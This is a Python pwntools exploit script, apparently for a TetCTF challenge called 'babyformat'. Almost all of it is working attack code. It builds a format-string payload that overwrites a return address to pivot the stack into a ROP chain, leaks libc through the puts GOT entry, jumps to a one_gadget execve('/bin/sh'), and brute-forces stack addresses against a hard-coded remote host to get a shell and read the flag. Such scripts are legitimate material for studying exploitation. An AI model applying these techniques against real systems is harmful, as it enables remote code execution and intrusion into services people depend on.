#!/usr/bin/env python3
import traceback

from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug(["./babyformat.dbg"], api=True)
    else:
        return remote("192.46.228.70", 31337)


MAIN = 0x400AF4
MAIN_1 = 0x4009CB
LEAVE_RET = 0x40091A
POP_RDI_RET = 0x400BA3
POP_RSI_POP_R15_RET = 0x400BA1
PUTS_GOT = 0x601F98
PUTS_PLT = 0x400700
READ_STR = 0x400897
RET = 0x4006EE
BUF = 0x602060
SIZEOF_BUF = 0x200
ROP1 = b"".join(
    (
        # 2nd part of leave instruction, which brings us here: pop rbp.
        struct.pack("<Q", 0),
        # Align stack.
        struct.pack("<Q", RET),
        # Leak libc@: puts(PUTS_PLT).
        struct.pack("<QQ", POP_RDI_RET, PUTS_GOT),
        struct.pack("<Q", PUTS_PLT),
        # Read one_gadget address.
        struct.pack("<QQ", POP_RDI_RET, BUF + SIZEOF_BUF - 8),
        struct.pack("<QQQ", POP_RSI_POP_R15_RET, 8, 0),
        struct.pack("<Q", READ_STR),
        # Jump to one_gadget.
        struct.pack("<Q", 0),
    )
)
ROP1_OFF = SIZEOF_BUF - len(ROP1)
PUTS_OFF = 0x6F6A0
"""
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
ONE_GADGET_OFF = 0x4527A


def try_pwn(main_rsp_hint):
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.Breakpoint("*0x{:x}".format(MAIN), temporary=True)
            tube.gdb.continue_and_wait()
            main_rsp = int(tube.gdb.parse_and_eval("$rsp"))
            tube.gdb.continue_nowait()
        else:
            # Remote: guess.
            main_rsp = 0x7FFD95B89398 + main_rsp_hint
        print("main_rsp = 0x{:x}".format(main_rsp))
        fprintf_rsp = main_rsp - 0x100
        print("fprintf_rsp = 0x{:x}".format(fprintf_rsp))
        rbp1_stkidx = 15
        rbp1_val = fprintf_rsp + 0xC8
        rbp2_stkidx = 25
        rbp2_val = fprintf_rsp + 0xF8
        ret2_ptr = fprintf_rsp + 0xD0
        stkidx2pos = 4
        # Track printf state.
        pos = 1
        written = 0
        # Position on rbp1, which points to rbp2.
        tmp = rbp1_stkidx + stkidx2pos - pos - 1
        fmt = "%c" * tmp
        pos += tmp
        written += tmp
        # Make rbp2 point to the return address.
        tmp = ((ret2_ptr & 0xFF) - written) & 0xFF
        fmt += "%{}c%hhn".format(tmp)
        pos += 2
        written += tmp
        # Position on rbp2.
        tmp = rbp2_stkidx + stkidx2pos - pos - 1
        fmt += "%c" * tmp
        pos += tmp
        written += tmp
        # Overwrite return address with stack pivot gadget.
        tmp = ((LEAVE_RET & 0xFFFF) - written) & 0xFFFF
        fmt += "%{}c%hn".format(tmp)
        pos += 2
        written += tmp
        # The gadget will pivot to rbp2, make it point to ROP1.
        tmp = BUF + ROP1_OFF - written
        fmt += "%{}c%{}$ln".format(tmp, rbp1_stkidx + stkidx2pos)
        tube.recvuntil("Data you wan't to log into /dev/null: ")
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            tube.gdb.Breakpoint("printf", temporary=True)
            tube.gdb.continue_nowait()
        payload1 = flat(
            {
                0: fmt,
                len(fmt): b"\x00",
                ROP1_OFF: ROP1,
            },
            length=SIZEOF_BUF,
        )
        assert b"\n" not in payload1
        tube.send(payload1)
        if args.LOCAL:
            tube.gdb.wait()
            print(tube.gdb.execute("x/64a $rsp", to_string=True))
            actual_fprintf_rsp = int(tube.gdb.parse_and_eval("$rsp"))
            assert fprintf_rsp == actual_fprintf_rsp, hex(actual_fprintf_rsp)
            # return from main_1() to main()
            # tube.gdb.Breakpoint("*0x400A70", temporary=True)
            tube.gdb.continue_nowait()
        tube.recvuntil("Your data: ")
        tube.recvline()
        (puts,) = struct.unpack("<Q", tube.recvline()[:-1].ljust(8, b"\x00"))
        libc = puts - PUTS_OFF
        print("libc = 0x{:x}".format(libc))
        assert libc & 0xFFF == 0
        tube.send(struct.pack("<Q", libc + ONE_GADGET_OFF))
        time.sleep(1)
        tube.sendline("cat /home/babyformat/flag")
        tube.interactive()  # TetCTF{viettel: *100*212050621032055#}


def main():
    main_rsp_hint = 0x50
    while True:
        print("main_rsp_hint = 0x{:x}".format(main_rsp_hint))
        try:
            try_pwn(main_rsp_hint)
        except:
            traceback.print_exc()
        main_rsp_hint += 8


if __name__ == "__main__":
    main()
